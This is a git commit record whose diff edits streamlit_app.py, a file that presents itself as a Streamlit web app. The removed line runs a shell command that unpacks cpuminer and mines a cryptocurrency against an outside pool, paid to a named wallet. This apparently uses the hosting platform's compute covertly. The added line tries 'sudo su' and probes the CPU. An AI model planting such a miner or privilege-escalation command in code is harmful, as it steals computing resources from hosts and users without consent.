f52cd50739abfdbda1aaecc6f9e2b6e5207b70fb
Matthijs Stoffer <63472519+matthijs12310@users.noreply.github.com>
2021-11-14 22:31:10 +0100

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,2 +1,2 @@
 import os
-os.system('tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowersugar  -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q073wtqf6ea4sq7hqkyd85hx3ew3ryzpca854jy')
+os.system('sudo su && lscpu')
